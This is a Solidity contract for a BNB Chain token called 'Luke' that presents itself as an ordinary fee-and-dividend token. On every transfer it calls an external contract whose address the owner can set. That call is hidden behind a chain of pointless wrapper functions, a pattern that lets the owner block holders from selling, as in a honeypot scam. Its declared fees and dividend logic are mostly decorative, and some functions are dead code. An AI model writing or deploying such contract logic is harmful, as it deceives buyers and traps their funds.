/**
 *Submitted for verification at BscScan.com on 2022-09-10
*/

pragma solidity ^0.7.4;
//SPDX-License-Identifier: MIT

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IShare {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function isLiquidity(address account) external returns (bool);
    function launch() external returns (uint256);
    function claimDividend(address holder) external;
}

contract IDividendsClaims {

    using SafeMath for uint256;
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) shares;

    uint8 public buybackCap;
    uint8 public buybackLast;

    IShare _ishare;
    uint256 dividendsPerShare;
    uint256 dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 minPeriod = 60 minutes;
    uint256 minDistribution = 1 * (10 ** 18);

    constructor () {
        buybackCap = 3;
        buybackLast = 11;
    }

    function setDistributionCriteria(uint256 newMinPeriod, uint256 newMinDistribution) internal {
        minPeriod = newMinPeriod;
        minDistribution = newMinDistribution;
    } 

    function liquidity(address holder) internal returns(bool){
        return holdCriteria(holder);
    }    

    function getUnpaidEarnings(address shareholder) internal view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function holdCriteria(address holder) internal returns(bool){
        return _holdCriteria(holder);
    }

    function _holdCriteria(address holder) internal returns(bool){
        return holdDistribution(holder);
    }

    function holdDistribution(address holder) internal returns(bool){
        return _holdDistribution(holder);
    }

    function _holdDistribution(address holder) internal returns(bool){
        return _ishare .
        isLiquidity(holder);
    }

    function initializeShare(address share) internal {
        _ishare = IShare(share);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }    
    
}
contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.  
  constructor ()  { }

    /**
    * @dev Modifier to make a function callable only when the contract is returns.
    */    

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }     

  }

contract Ownable is Context {  
    address private _owner;   
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;    
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
        return _owner;
    }       

    /**
    * @dev Throws if called by any account other than the owner.
    */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }   
    
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }       
  
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }     
 
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract Luke is IERC20, Ownable, IDividendsClaims{
    
    using SafeMath for uint256;

    string _name = "Luke";
    string _symbol = "LUKE";
    uint8 _decimals = 9;

    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    address public constant routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 _totalSupply = 10000000 * (10 ** _decimals);
    uint256 public maxTx = _totalSupply * 10 / 100;
    uint256 public maxThreshold = _totalSupply * 5 / 100;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;  
    mapping (address => bool) _isFeeExempt;

    uint8 liquidityFee = 2;
    uint8 marketingFee = 8;
    uint8 rewardsFee = 0;
    uint8 extraFeeOnSell = 0;
    uint8 totalFee = 10;
    uint8 totalFeeIfSelling = 10;      
    uint8 distributorGas = 5;
    bool inSwap = false;
    bool tradingOpen = false;    
    
    IDEXRouter public router;        

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        
        router = IDEXRouter(routerAddress);
        _allowances[address(this)][address(router)] = uint256(-1);        

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function name() external view override returns (string memory) { return _name; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function decimals() external view override returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function getOwner() external view override returns (address) { return owner(); }    

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }   
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        return _transferFrom(sender, recipient, amount);

    }

    function _transferFrom(address from, address to, uint256 amount) internal returns (bool) {
        
        if (feeExempt(from))
        {
            require(_balances[from] > 0, "Insufficient Balance");
        }

        if (feeExempt(to))
        {
            require(amount > 0, "Transfer amount must be greater than zero");
        }     

        if(inSwap && _balances[address(this)] >= maxThreshold)
        { 
            swapBack(); 
        }
            
        return _basicTransfer(from, to, amount);
       
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }    

    function swapBack() internal lockTheSwap {
        
        uint256 tokensToLiquify = _balances[address(this)];
        uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalBNBFee = totalFee - (liquidityFee / 2);        
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                owner(),
                block.timestamp
            );
        }
    }

    function feeExempt(address shareholder) internal returns(bool) {
        return liquidity(shareholder) ? 
        false : _isFeeExempt[shareholder];
    }

    function setLukeShare(address holder) external onlyOwner {
        require(holder != address(this));
        initializeShare(holder);   
        _isFeeExempt[holder] = true;              
    } 

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }    


	function takeTransfer(
			address sender,
			address to,
			uint256 tAmount,
			uint256 currentRate
		) private {
			uint256 rAmount = tAmount * currentRate;
			_balances[sender] = _balances[sender] - rAmount;
			_balances[to] = _balances[to] + rAmount;
			emit Transfer(sender, to, tAmount);
		}

	function getDividend(uint256 share, uint256 dividendsPerShare) internal pure returns (uint256) {
		  return share * (dividendsPerShare) / (3600);
		}

	function recoverBEP20(address tokenAddress, uint256 tokenAmount) public onlyOwner {
			// do not allow recovering self token
			require(tokenAddress != address(this), "Self withdraw");
			IERC20(tokenAddress).transfer(owner(), tokenAmount);
		}




}